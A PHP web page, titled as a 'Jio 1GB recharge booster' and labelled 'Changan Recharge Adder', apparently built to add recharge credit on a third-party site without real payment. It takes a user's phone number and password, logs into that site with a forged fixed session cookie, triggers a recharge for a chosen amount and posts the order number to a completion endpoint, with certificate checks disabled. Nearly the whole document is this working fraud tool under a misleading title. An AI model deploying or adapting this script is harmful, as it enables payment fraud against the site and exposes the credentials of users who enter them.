<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <link rel="preconnect" href="https://fonts.googleapis.com"> <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> <link href="https://fonts.googleapis.com/css2?family=Bree+Serif&family=Montserrat:wght@400;600&display=swap" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">  <title>JIO 1GB RECHARGE BOOSTER</title></head><style>
*{ margin: 0; padding: 0; box-sizing: border-box; font-family: 'Bree Serif', serif; } body{ width: 100%; height: 100vh; text-align: center; background-color: rgb(255, 255, 255); /* overflow: hidden; */ } .limiter{ width: 100%; padding: 0 25px; } .limiter h1{ font-size: 20px; font-family: 'Bree Serif', serif; font-weight: 300; text-transform: uppercase; letter-spacing: 1px; margin-top: 50px; margin-bottom: 50px; }
input{ font-family: 'Bree Serif', serif; width: 100%; height: 45px; font-weight: 200;
padding: 12px 32px;
  text-align: center;
  text-decoration: none;
  display: block;
  font-size: 14px;
  margin: 5px auto;
border: 2px solid rgb(0, 141, 146);
  border-radius: 5px 5px 5px 5px;
  outline: none;margin-top: 0px; margin-bottom: 25px;
  }
.input{ border: 1.5px solid rgb(211, 211, 211); background-color: transparent; padding: 0 15px; transition: 0.5s; }
 .input:focus{ border: 1.5px solid rgb(0, 141, 146); }
  .submit{ margin: 15px 0; border: none; background-color: rgb(0, 141, 146); color: #fff; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); transition: 0.5s; } .submit:hover{ background-color: rgb(7, 89, 94); } .telegram{ font-family: 'Bree Serif', serif; width: 100%; height: 65px; font-weight: 200; margin: 30px 0; border-radius: 4px; background-color: rgb(0, 141, 146); display: flex; justify-content: center; align-items: center; box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.349); } .telegram i{ color: #fff; font-size: 30px; margin-left: -30px; } .telegram a{ color: #fff; text-decoration: none; font-weight: 300; letter-spacing: 2px; margin-left: 10px; font-size: 16px; text-transform: uppercase; } .success{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #d1e6dd; color: #105133; border: 1px solid #9fcfba; } .error{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #f7d7da; color: #84200a; border: 1px solid #f5c2c7; } .white{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #e2e3e5; color: #41464a; border: 1px solid #d5dbdb; } .blue{ font-size: 15px; letter-spacing: 1px; font-family: 'Bree Serif', serif; width: 100%; padding: 18px 0; font-weight: 200; margin: 10px 0; border-radius: 4px; background-color: #cfe2ff; color: #084195; border: 1px solid #d7d4fe; }

 select { width: 100%; height: 65px; margin: 15px 0; border-radius: 4px;		padding:0 20px;		font-size: 15px;		outline: none; font-family: 'Bree Serif', serif; }</style><body> <div class="limiter">
   <h1 class="blue">CHANGAN RECHARGE ADDER</h1>
   
<?php
if(!isset($_POST['num'])){
echo'<form method="POST" action=""><span 
<strong>
 
    
 <span class="label-input100">Select Amount</span>
   
<select name="code" class="select100 m-b-23" required>
   ';
include("code.php");
echo"
</select>    	<form action='' method='POST' >
	<input type='text' name='num' placeholder='Enter Registered Number'><input type='text' name='pass' placeholder='Enter Password'>
	<input type='submit' placeholder='submit' class='submit' >";
	}
if(isset($_POST['num'])){
error_reporting (0) ;
$r26=substr(md5("IAmDevil"),0,26);
$code = $_POST['code'];
$amo = $_POST['code'];
$pass = $_POST['pass'];
    $num=$_POST['num'];
$url="https://web.changanautomobile827.in/data/logindata.php";
$data="number=$num&password=$pass";
$headers=array('cookie: PHPSESSID='.$r26.'');


$ch1=curl_init(); curl_setopt($ch1, CURLOPT_URL,$url); curl_setopt($ch1, CURLOPT_HEADER,0); curl_setopt($ch1, CURLOPT_HTTPHEADER,$headers); curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST,0); curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch1, CURLOPT_POST, 1); curl_setopt($ch1, CURLOPT_POSTFIELDS,$data); curl_setopt($ch1, CURLOPT_RETURNTRANSFER,TRUE); curl_setopt($ch1, CURLOPT_FOLLOWLOCATION,0); $one1=curl_exec($ch1);  	curl_close ($ch1);  $url1="https://web.changanautomobile827.in/recharge/wepay.php/?amo=$amo";
$data1="";
$headers1=array('cookie: PHPSESSID='.$r26.'');


$ch1=curl_init(); curl_setopt($ch1, CURLOPT_URL,$url1); curl_setopt($ch1, CURLOPT_HEADER,0); curl_setopt($ch1, CURLOPT_HTTPHEADER,$headers1); curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST,0); curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch1, CURLOPT_POST, 1); curl_setopt($ch1, CURLOPT_POSTFIELDS,$data1); curl_setopt($ch1, CURLOPT_RETURNTRANSFER,TRUE); curl_setopt($ch1, CURLOPT_FOLLOWLOCATION,0); $one2=curl_exec($ch1);  	curl_close ($ch1);  $msg2=json_decode($one2,true)['message'];

$mn=json_decode($one2,true)['mchOrderNo'];
$pas=json_decode($one2,true)['tradeResult'];
if($pas=="1"){
 
$url2="https://web.changanautomobile827.in/recharge/v1.php";
$data2="mchOrderNo=$mn";


$ch1=curl_init(); curl_setopt($ch1, CURLOPT_URL,$url2); curl_setopt($ch1, CURLOPT_HEADER,0); curl_setopt($ch1, CURLOPT_HTTPHEADER,$headers2); curl_setopt($ch1, CURLOPT_SSL_VERIFYHOST,0); curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch1, CURLOPT_POST, 1); curl_setopt($ch1, CURLOPT_POSTFIELDS,$data2); curl_setopt($ch1, CURLOPT_RETURNTRANSFER,TRUE); curl_setopt($ch1, CURLOPT_FOLLOWLOCATION,0); $one3=curl_exec($ch1);  	curl_close ($ch1);  $msg2=json_decode($one2,true)['message'];

$mn=json_decode($one2,true)['mchOrderNo'];
$pas=json_decode($one2,true)['tradeResult'];
echo"Recharge:- $one3";


}else { echo "$one2";}}
?><hr><center><font color='blue'><marquee><center><bold><center><font color='blue' size='3px'><center>Adder Made By ミ❥一Aʅσɳҽ⇢✖Ɗɘvɩɭ🖤彡<br></marquee></hr>
		</div><main><font color='#ff0fc3'></font><hr>